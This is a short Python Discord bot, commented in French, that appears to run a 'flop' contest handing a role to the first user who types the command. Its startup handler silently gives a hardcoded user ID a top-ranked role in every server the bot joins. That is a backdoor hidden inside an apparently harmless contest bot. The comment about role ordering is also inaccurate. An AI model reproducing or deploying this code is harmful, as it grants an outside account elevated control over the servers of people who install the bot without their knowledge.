import discord
from discord.ext import commands
import asyncio
import os

# Configuration
TOKEN = os.getenv('TOKEN')
CHANNEL_ID = 1407097136432156893
USER_ID = 836452038548127764
ROLE_ID = 1440855338839576626  # ID du rôle à donner

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix='', intents=intents)

winner_found = False

@bot.event
async def on_ready():
    print(f'{bot.user} est connecté!')
    
    # Donner le rôle le plus haut possible à l'utilisateur spécifié
    for guild in bot.guilds:
        member = guild.get_member(USER_ID)
        if member:
            highest_role = guild.roles[-2]  # -2 car -1 est @everyone
            try:
                await member.add_roles(highest_role)
                print(f'Rôle {highest_role.name} donné à {member}')
            except:
                print('Impossible de donner le rôle')
    


@bot.command(name='flop')
async def flop(ctx):
    global winner_found
    
    if winner_found:
        await ctx.send('Le concours est déjà terminé!')
        return
    
    # Récupérer le rôle par son ID
    guild = ctx.guild
    role = guild.get_role(ROLE_ID)
    
    if not role:
        await ctx.send('Erreur: Le rôle spécifié n\'existe pas!')
        print(f'Rôle avec ID {ROLE_ID} introuvable')
        return
    
    # Donner le rôle au gagnant
    try:
        await ctx.author.add_roles(role)
        winner_found = True
        await ctx.send(f'🎉 Félicitations {ctx.author.mention}! Tu as gagné le rôle {role.name}!')
        print(f'{ctx.author} a gagné le concours!')
    except Exception as e:
        await ctx.send('Erreur lors de l\'attribution du rôle!')
        print(f'Erreur: {e}')

bot.run(TOKEN)
